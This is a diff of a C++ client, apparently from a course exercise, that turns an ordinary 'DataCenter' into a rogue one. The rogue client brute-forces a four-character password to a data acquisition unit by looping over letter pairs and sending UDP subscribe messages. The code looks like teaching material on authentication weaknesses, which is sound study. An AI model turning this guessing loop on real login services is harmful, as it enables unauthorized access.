@@ -1,4 +1,5 @@
-//DataCenter.cpp - Function definitions for the Data Center
+//DataCenterRogue1.cpp - Function definitions for the rogue Data Center
+//                       This data center will attempt to guess the password
 //
 // History:
 // 05-May-22  M. Watler         Created.
@@ -13,34 +14,34 @@
 #include <sys/types.h>
 #include <sys/un.h>
 #include <unistd.h>
-#include "DataCenter.h"
+#include "DataCenterRogue1.h"
 
 using namespace std;
 
-DataCenter* DataCenter::instance=nullptr;
+DataCenterRogue1* DataCenterRogue1::instance=nullptr;
 
 static void shutdownHandler(int sig)
 {
     switch(sig) {
         case SIGINT:
-            DataCenter::instance->shutdown();
+            DataCenterRogue1::instance->shutdown();
 	    break;
     }
 }
 
-DataCenter::DataCenter(int num) {
+DataCenterRogue1::DataCenterRogue1(int num) {
     is_running=false;
     is_subscribed=false;
     dataCenterNo = num;
-    DataCenter::instance=this;
+    DataCenterRogue1::instance=this;
 }
 
-void DataCenter::shutdown() {
-    cout<<"DataCenter::shutdown:"<<endl;
+void DataCenterRogue1::shutdown() {
+    cout<<"DataCenterRogue1::shutdown:"<<endl;
     is_running=false;
 }
 
-int DataCenter::run()
+int DataCenterRogue1::run()
 {
     int ret, len;
     struct sockaddr_in myaddr;
@@ -112,17 +113,26 @@ int DataCenter::run()
 
     char message[BUF_LEN];
     while(is_running && !is_subscribed) {
-        //authenticate with the data acquisition unit
-	cout<<"dataCenter:"<<dataCenterNo<<" attempting to subscribe"<<endl;
-        len = sprintf(message, "Subscribe,DataCenter%d,Leaf", dataCenterNo);
-        ret = sendto(fd, message, len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
-        sleep(5);
+        //authenticate with the data acquisition unit by guessing the password
+	char passwordGuess[BUF_LEN];
+        passwordGuess[4]='\0';//DataRogue1 knows the password is 4 characters long, consists of alphabetic characters, and the first two characters are 'L' and 'e'
+        passwordGuess[0]='L';
+        passwordGuess[1]='e';
+        for(int c=65; c<123 && !is_subscribed; ++c){//the alphabetic spectrum
+            passwordGuess[2]=(char)c;
+            for(int d=65; d<123 && !is_subscribed; ++d){//the alphabetic spectrum
+                passwordGuess[3]=(char)d;
+                len = sprintf(message, "Subscribe,DataCenterRogue1%d,%s", dataCenterNo, passwordGuess);
+                ret = sendto(fd, message, len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
+                sleep(0.3);
+            }
+        }
     }
     sleep(30);
     //cancel with the data acquisition unit
-    len = sprintf(message, "Cancel,DataCenter%d", dataCenterNo);
+    len = sprintf(message, "Cancel,DataCenterRogue1%d", dataCenterNo);
     ret = sendto(fd, message, len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
-    is_running=false;
+    is_running=false;//Got all the data, now exit everything
 
     cout<<"dataCenter:"<<dataCenterNo<<" is quitting..."<<endl;
     pthread_join(tid, NULL);
@@ -132,12 +142,12 @@ int DataCenter::run()
 
 void *recv_func(void *arg)
 {
-    DataCenter *dataCenter = (DataCenter *)arg;
+    DataCenterRogue1 *dataCenter = (DataCenterRogue1 *)arg;
     dataCenter->ReceiveFunction();
     pthread_exit(NULL);
 }
 
-void DataCenter::ReceiveFunction()
+void DataCenterRogue1::ReceiveFunction()
 {
     char buf[BUF_LEN];
     struct sockaddr_in recvaddr;
